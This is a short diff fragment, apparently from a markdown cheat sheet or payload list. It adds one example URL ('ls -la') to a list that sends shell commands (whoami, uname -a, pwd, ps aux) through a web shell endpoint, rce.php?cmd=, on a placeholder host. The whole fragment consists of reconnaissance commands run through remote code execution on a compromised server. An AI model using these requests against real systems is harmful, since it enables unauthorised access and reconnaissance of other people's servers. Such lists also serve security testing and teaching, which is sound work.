@@ -34,6 +34,7 @@ http://site.com/rce.php?cmd=whoami
 http://site.com/rce.php?cmd=uname -a
 http://site.com/rce.php?cmd=pwd
 http://site.com/rce.php?cmd=ps aux
+http://site.com/rce.php?cmd=ls -la
 
 ```
 
